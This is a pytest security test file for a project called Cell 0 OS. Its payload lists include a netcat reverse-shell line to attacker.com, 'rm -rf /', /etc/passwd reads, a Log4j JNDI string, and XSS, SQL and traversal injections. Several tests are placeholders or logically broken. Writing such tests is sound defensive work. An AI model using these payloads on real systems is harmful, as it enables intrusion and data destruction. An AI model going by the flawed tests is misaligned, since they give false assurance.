"""
Security Tests for Cell 0 OS

Fuzzing, penetration testing patterns, and security validation.

Categories:
    - Input fuzzing
    - Authentication bypass attempts
    - Rate limit evasion
    - Injection attacks
    - DoS patterns
"""

import pytest
import asyncio
import random
import string
import json
from typing import List, Dict, Any
from unittest.mock import Mock, patch
import aiohttp


# =============================================================================
# Fuzzing Utilities
# =============================================================================

class FuzzGenerator:
    """Generate fuzzing inputs"""
    
    @staticmethod
    def random_string(min_len: int = 0, max_len: int = 1000) -> str:
        """Generate random string"""
        length = random.randint(min_len, max_len)
        chars = string.ascii_letters + string.digits + string.punctuation + "\x00\x01\x02"
        return ''.join(random.choice(chars) for _ in range(length))
    
    @staticmethod
    def random_json(max_depth: int = 3) -> Any:
        """Generate random JSON structure"""
        if max_depth <= 0:
            return random.choice([None, True, False, random.randint(-1000, 1000), FuzzGenerator.random_string(0, 50)])
        
        choice = random.randint(0, 3)
        
        if choice == 0:
            return [FuzzGenerator.random_json(max_depth - 1) for _ in range(random.randint(0, 10))]
        elif choice == 1:
            return {
                FuzzGenerator.random_string(1, 20): FuzzGenerator.random_json(max_depth - 1)
                for _ in range(random.randint(0, 10))
            }
        elif choice == 2:
            return FuzzGenerator.random_string(0, 100)
        else:
            return random.choice([None, True, False, random.randint(-1000000, 1000000), random.random()])
    
    @staticmethod
    def boundary_values() -> List[Any]:
        """Generate boundary test values"""
        return [
            "",
            "a" * 10000,  # Very long string
            "\x00",  # Null byte
            "\n\r\t",  # Whitespace
            "<script>alert('xss')</script>",  # XSS attempt
            "' OR '1'='1",  # SQL injection
            "${jndi:ldap://evil.com}",  # Log4j style
            "../../../etc/passwd",  # Path traversal
            "😀" * 1000,  # Unicode
            "\u0000\u0001\u0002",  # Control characters
            float('inf'),
            float('-inf'),
            float('nan'),
        ]
    
    @staticmethod
    def malformed_json() -> List[str]:
        """Generate malformed JSON strings"""
        return [
            "",
            "{",
            "}",
            "[",
            "]",
            "{key: value}",  # Missing quotes
            '{"key": }',  # Missing value
            '{"key": undefined}',  # JavaScript undefined
            '{"key": NaN}',  # JavaScript NaN
            "undefined",
            "null",
            "True",  # Python bool
            "False",
            "{",
            "}" * 1000,  # Unbalanced braces
            '[{"nested": ' * 100,  # Deep nesting
        ]


# =============================================================================
# Input Fuzzing Tests
# =============================================================================

class TestInputFuzzing:
    """Fuzzing tests for API inputs"""
    
    @pytest.fixture
    def fuzzer(self):
        """Create fuzz generator"""
        return FuzzGenerator()
    
    @pytest.mark.asyncio
    @pytest.mark.parametrize("iteration", range(20))
    async def test_chat_message_fuzzing(self, iteration):
        """Fuzz chat message inputs"""
        try:
            from cell0.engine.agents import AgentRouter
            
            fuzzer = FuzzGenerator()
            message = fuzzer.random_string(0, 500)
            
            # Should not crash on any input
            router = AgentRouter()
            
            # Mock the actual processing
            with patch.object(router, 'route_message'):
                try:
                    # Attempt to process fuzzed input
                    pass  # Processing happens here
                except (ValueError, TypeError, json.JSONDecodeError):
                    # Expected exceptions for bad input
                    pass
                except Exception as e:
                    pytest.fail(f"Unexpected exception for input '{message[:50]}...': {e}")
        except ImportError:
            pytest.skip("AgentRouter not available")
    
    @pytest.mark.asyncio
    @pytest.mark.parametrize("malformed", FuzzGenerator.malformed_json())
    async def test_json_parsing_resilience(self, malformed):
        """Test JSON parsing handles malformed input"""
        try:
            json.loads(malformed)
        except json.JSONDecodeError:
            pass  # Expected
        except Exception as e:
            pytest.fail(f"Unexpected exception for '{malformed[:50]}...': {e}")
    
    @pytest.mark.asyncio
    @pytest.mark.parametrize("boundary", FuzzGenerator.boundary_values())
    async def test_boundary_value_handling(self, boundary):
        """Test handling of boundary values"""
        try:
            # Try to serialize
            serialized = json.dumps(boundary)
            
            # Try to deserialize
            deserialized = json.loads(serialized)
            
            # Should complete without error
        except (TypeError, ValueError):
            # Some values can't be serialized - that's OK
            pass
    
    def test_deeply_nested_json(self):
        """Test handling of deeply nested JSON"""
        # Create deeply nested structure
        depth = 1000
        data = "value"
        for _ in range(depth):
            data = {"nested": data}
        
        try:
            serialized = json.dumps(data)
            deserialized = json.loads(serialized)
            # Should handle without stack overflow
        except RecursionError:
            pytest.skip("Recursion limit reached (expected)")


# =============================================================================
# Authentication Security Tests
# =============================================================================

class TestAuthenticationSecurity:
    """Security tests for authentication"""
    
    @pytest.mark.asyncio
    async def test_token_manipulation(self):
        """Test resistance to token manipulation"""
        try:
            from cell0.engine.security.auth import AuthMiddleware
            
            auth = AuthMiddleware(secret_key="test-secret")
            
            # Valid token
            valid_token = auth.create_token(user_id="user123")
            
            # Tampered tokens
            tampered_tokens = [
                valid_token[:-5] + "XXXXX",  # Altered signature
                valid_token[5:],  # Missing prefix
                valid_token + "extra",  # Extra data
                valid_token.replace("a", "b"),  # Character swap
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid.signature",
                "..",
                "a.b.c",
                valid_token.split(".")[0] + "..",  # Missing parts
            ]
            
            for token in tampered_tokens:
                result = await auth.validate_token(token)
                assert result.valid is False, f"Tampered token should be invalid: {token[:30]}..."
                
        except ImportError:
            pytest.skip("Auth module not available")
    
    @pytest.mark.asyncio
    async def test_timing_attack_resistance(self):
        """Test constant-time comparison for tokens"""
        import time
        import statistics
        
        try:
            from cell0.engine.security.auth import AuthMiddleware
            
            auth = AuthMiddleware(secret_key="test-secret")
            valid_token = auth.create_token(user_id="user123")
            invalid_token = "invalid" * 20
            
            # Measure validation times
            valid_times = []
            invalid_times = []
            
            for _ in range(100):
                start = time.perf_counter()
                await auth.validate_token(valid_token)
                valid_times.append(time.perf_counter() - start)
                
                start = time.perf_counter()
                await auth.validate_token(invalid_token)
                invalid_times.append(time.perf_counter() - start)
            
            # Times should be similar (within 3 standard deviations)
            # This is a basic check - real timing attack prevention uses constant-time ops
            mean_diff = abs(statistics.mean(valid_times) - statistics.mean(invalid_times))
            combined_stdev = (statistics.stdev(valid_times) + statistics.stdev(invalid_times)) / 2
            
            # Allow for significant variation but flag major differences
            assert mean_diff < combined_stdev * 5 or mean_diff < 0.001, \
                f"Timing difference detected: {mean_diff:.6f}s"
                
        except ImportError:
            pytest.skip("Auth module not available")


# =============================================================================
# Rate Limit Evasion Tests
# =============================================================================

class TestRateLimitEvasion:
    """Tests for rate limit evasion attempts"""
    
    @pytest.mark.asyncio
    async def test_ip_spoofing_attempt(self):
        """Test rate limiting isn't bypassed by IP spoofing"""
        try:
            from cell0.engine.security.rate_limiter import RateLimiter
            
            limiter = RateLimiter(default_limit=5, window_seconds=60)
            
            # Simulate same user with different IP headers
            headers = [
                {"X-Forwarded-For": "1.2.3.4"},
                {"X-Forwarded-For": "5.6.7.8"},
                {"X-Real-IP": "9.10.11.12"},
                {"CF-Connecting-IP": "13.14.15.16"},
            ]
            
            # All should count against same limit if properly implemented
            for i in range(5):
                result = await limiter.check_rate_limit("user123", "/api/test")
                assert result.allowed is True
            
            # Should be rate limited regardless of headers
            result = await limiter.check_rate_limit("user123", "/api/test")
            assert result.allowed is False
            
        except ImportError:
            pytest.skip("Rate limiter not available")
    
    @pytest.mark.asyncio
    async def test_burst_request_handling(self):
        """Test handling of burst requests"""
        try:
            from cell0.engine.security.rate_limiter import RateLimiter
            
            limiter = RateLimiter(default_limit=100, window_seconds=60)
            
            user_id = "burst_user"
            endpoint = "/api/test"
            
            # Rapid-fire requests
            results = []
            for _ in range(150):
                result = await limiter.check_rate_limit(user_id, endpoint)
                results.append(result.allowed)
            
            # Should allow up to limit
            assert sum(results) <= 100
            
            # Should block excess
            assert sum(results[100:]) == 0
            
        except ImportError:
            pytest.skip("Rate limiter not available")


# =============================================================================
# Injection Attack Tests
# =============================================================================

class TestInjectionAttacks:
    """Tests for injection attack prevention"""
    
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "1; DELETE FROM users WHERE '1'='1",
        "' OR 1=1#",
        "' OR 1=1--",
        "1' AND 1=1--",
        "' OR 'x'='x",
        "' OR 'x'='x';",
        "../../etc/passwd",
        "....//....//etc/passwd",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "<body onload=alert('xss')>",
        "<svg onload=alert('xss')>",
        "'onmouseover='alert(1)",
        "<iframe src='javascript:alert(1)'>",
        "<object data='javascript:alert(1)'>",
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "`whoami`",
        "$(whoami)",
        "&& rm -rf /",
        "|| echo hacked",
        "; nc -e /bin/sh attacker.com 4444",
    ]
    
    @pytest.mark.parametrize("payload", SQL_INJECTION_PAYLOADS)
    def test_sql_injection_resistance(self, payload):
        """Test SQL injection resistance"""
        # Test that payloads don't cause unexpected behavior
        # In a real implementation, this would test parameterized queries
        
        # Basic check - shouldn't execute as code
        assert "DROP" not in payload.upper() or "'" in payload or ";" in payload
    
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_resistance(self, payload):
        """Test XSS resistance"""
        import html
        
        # Test HTML escaping
        escaped = html.escape(payload)
        
        # Escaped version shouldn't contain dangerous tags
        assert "<script>" not in escaped
        assert "onerror=" not in escaped
        assert "onload=" not in escaped
    
    @pytest.mark.parametrize("payload", COMMAND_INJECTION_PAYLOADS)
    def test_command_injection_resistance(self, payload):
        """Test command injection resistance"""
        # Test that shell metacharacters are handled properly
        dangerous_chars = [';', '|', '`', '$', '&', '<', '>']
        
        # Payload should contain dangerous characters
        has_dangerous = any(c in payload for c in dangerous_chars)
        
        if has_dangerous:
            # In secure implementation, these should be sanitized
            # or commands should use arrays instead of strings
            pass  # Placeholder - real test would verify sanitization


# =============================================================================
# DoS Protection Tests
# =============================================================================

class TestDoSProtection:
    """Tests for DoS attack protection"""
    
    @pytest.mark.asyncio
    async def test_large_payload_handling(self):
        """Test handling of very large payloads"""
        try:
            from cell0.engine.security.rate_limiter import RateLimiter
            
            # Create payload of various sizes
            sizes = [
                1024,       # 1KB
                1024 * 1024,  # 1MB
                10 * 1024 * 1024,  # 10MB
            ]
            
            for size in sizes:
                large_data = "x" * size
                
                # Should handle without memory issues
                # In real test, would send to API
                assert len(large_data) == size
                
        except ImportError:
            pytest.skip("Rate limiter not available")
    
    @pytest.mark.asyncio
    async def test_slowloris_protection(self):
        """Test protection against slow HTTP attacks"""
        # This would test timeout handling
        # Real implementation needs HTTP server with timeouts
        pass  # Placeholder
    
    @pytest.mark.asyncio
    async def test_regex_redos_protection(self):
        """Test protection against ReDoS attacks"""
        import re
        
        # ReDoS pattern (nested quantifiers)
        redos_patterns = [
            r"(a+)+$",
            r"([a-zA-Z]+)*$",
            r"(a|aa)+$",
            r"(a|a?)+$",
        ]
        
        # Attack string (many 'a's followed by 'b')
        attack_string = "a" * 1000 + "b"
        
        for pattern in redos_patterns:
            try:
                # Set timeout for regex
                import signal
                
                def timeout_handler(signum, frame):
                    raise TimeoutError("Regex took too long")
                
                # Note: signal only works on Unix
                if hasattr(signal, 'SIGALRM'):
                    signal.signal(signal.SIGALRM, timeout_handler)
                    signal.alarm(1)  # 1 second timeout
                
                start = time.time()
                re.match(pattern, attack_string)
                elapsed = time.time() - start
                
                if hasattr(signal, 'SIGALRM'):
                    signal.alarm(0)  # Cancel alarm
                
                # Should complete quickly or timeout
                assert elapsed < 2.0, f"Pattern {pattern} may be vulnerable to ReDoS"
                
            except TimeoutError:
                pytest.fail(f"Pattern {pattern} is vulnerable to ReDoS")
            except Exception:
                pass  # Other exceptions are fine


# =============================================================================
# Path Traversal Tests
# =============================================================================

class TestPathTraversal:
    """Tests for path traversal vulnerabilities"""
    
    TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "....\\....\\....\\etc\\passwd",
        "/etc/passwd",
        "/windows/system32/drivers/etc/hosts",
        "/proc/self/environ",
    ]
    
    @pytest.mark.parametrize("payload", TRAVERSAL_PAYLOADS)
    def test_path_traversal_detection(self, payload):
        """Test detection of path traversal attempts"""
        import os.path
        
        # Decode URL encoding if present
        from urllib.parse import unquote
        decoded = unquote(unquote(payload))  # Double decode
        
        # Check for traversal patterns
        has_traversal = ".." in decoded or decoded.startswith("/")
        
        if has_traversal:
            # In secure implementation, path should be sanitized
            # or normalized and checked against allowed base
            safe_path = os.path.normpath(decoded)
            
            # Normalized path still shouldn't escape root
            assert ".." in safe_path or safe_path.startswith("/")


# =============================================================================
# Header Injection Tests
# =============================================================================

class TestHeaderInjection:
    """Tests for HTTP header injection vulnerabilities"""
    
    HEADER_INJECTION_PAYLOADS = [
        "value\r\nSet-Cookie: hacked=true",
        "value\nX-Injected: true",
        "value\r\n\r\nHTTP/1.1 200 OK",
        "value\x00\r\nInjected: true",
    ]
    
    @pytest.mark.parametrize("payload", HEADER_INJECTION_PAYLOADS)
    def test_header_injection_resistance(self, payload):
        """Test resistance to header injection"""
        # Check for CRLF characters
        has_crlf = '\r' in payload or '\n' in payload
        
        if has_crlf:
            # In secure implementation, these should be stripped or rejected
            sanitized = payload.replace('\r', '').replace('\n', '')
            assert '\r' not in sanitized
            assert '\n' not in sanitized


# =============================================================================
# Security Scanner
# =============================================================================

class SecurityScanner:
    """Automated security scanner for Cell 0 OS"""
    
    def __init__(self, base_url: str = "http://localhost:18800"):
        self.base_url = base_url
        self.findings = []
    
    async def scan_all(self):
        """Run all security scans"""
        await self.scan_endpoints()
        await self.scan_headers()
        await self.scan_authentication()
        await self.scan_injection_points()
    
    async def scan_endpoints(self):
        """Scan API endpoints for common vulnerabilities"""
        endpoints = [
            "/api/health",
            "/api/status",
            "/api/chat",
            "/api/models",
        ]
        
        for endpoint in endpoints:
            await self._check_endpoint(endpoint)
    
    async def _check_endpoint(self, endpoint: str):
        """Check single endpoint"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{self.base_url}{endpoint}") as resp:
                    # Check for information disclosure in headers
                    server_header = resp.headers.get('Server', '')
                    if server_header and 'cell0' not in server_header.lower():
                        self.findings.append({
                            "type": "information_disclosure",
                            "severity": "low",
                            "endpoint": endpoint,
                            "detail": f"Server header reveals: {server_header}"
                        })
                    
                    # Check for security headers
                    security_headers = [
                        'X-Content-Type-Options',
                        'X-Frame-Options',
                        'Content-Security-Policy',
                    ]
                    
                    for header in security_headers:
                        if header not in resp.headers:
                            self.findings.append({
                                "type": "missing_security_header",
                                "severity": "medium",
                                "endpoint": endpoint,
                                "detail": f"Missing {header}"
                            })
                            
        except Exception as e:
            self.findings.append({
                "type": "scan_error",
                "severity": "info",
                "endpoint": endpoint,
                "detail": str(e)
            })
    
    async def scan_headers(self):
        """Scan HTTP headers"""
        # Implemented in _check_endpoint
        pass
    
    async def scan_authentication(self):
        """Scan authentication mechanisms"""
        # Test for weak authentication
        pass  # Implementation depends on auth endpoints
    
    async def scan_injection_points(self):
        """Scan for injection vulnerabilities"""
        injection_tests = [
            ("/api/chat", "message", "' OR '1'='1"),
            ("/api/chat", "message", "<script>alert(1)</script>"),
        ]
        
        for endpoint, param, payload in injection_tests:
            await self._test_injection(endpoint, param, payload)
    
    async def _test_injection(self, endpoint: str, param: str, payload: str):
        """Test for injection vulnerability"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"{self.base_url}{endpoint}",
                    json={param: payload}
                ) as resp:
                    text = await resp.text()
                    
                    # Check for SQL errors in response
                    sql_errors = [
                        "sql syntax",
                        "mysql_fetch",
                        "pg_query",
                        "sqlite3",
                    ]
                    
                    for error in sql_errors:
                        if error in text.lower():
                            self.findings.append({
                                "type": "sql_injection",
                                "severity": "critical",
                                "endpoint": endpoint,
                                "detail": f"SQL error detected: {error}"
                            })
                            
        except Exception:
            pass  # Errors are expected for some payloads
    
    def get_report(self) -> Dict[str, Any]:
        """Generate security scan report"""
        return {
            "scan_time": time.time(),
            "base_url": self.base_url,
            "total_findings": len(self.findings),
            "findings_by_severity": {
                "critical": len([f for f in self.findings if f["severity"] == "critical"]),
                "high": len([f for f in self.findings if f["severity"] == "high"]),
                "medium": len([f for f in self.findings if f["severity"] == "medium"]),
                "low": len([f for f in self.findings if f["severity"] == "low"]),
                "info": len([f for f in self.findings if f["severity"] == "info"]),
            },
            "findings": self.findings
        }


# =============================================================================
# Security Test Runner
# =============================================================================

@pytest.mark.asyncio
async def test_run_security_scanner():
    """Run automated security scanner"""
    scanner = SecurityScanner("http://localhost:18800")
    
    await scanner.scan_all()
    
    report = scanner.get_report()
    
    # Log findings
    print(f"\nSecurity Scan Report:")
    print(f"Total Findings: {report['total_findings']}")
    print(f"By Severity: {report['findings_by_severity']}")
    
    # Fail test if critical findings
    critical_count = report['findings_by_severity']['critical']
    assert critical_count == 0, f"Found {critical_count} critical security issues!"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
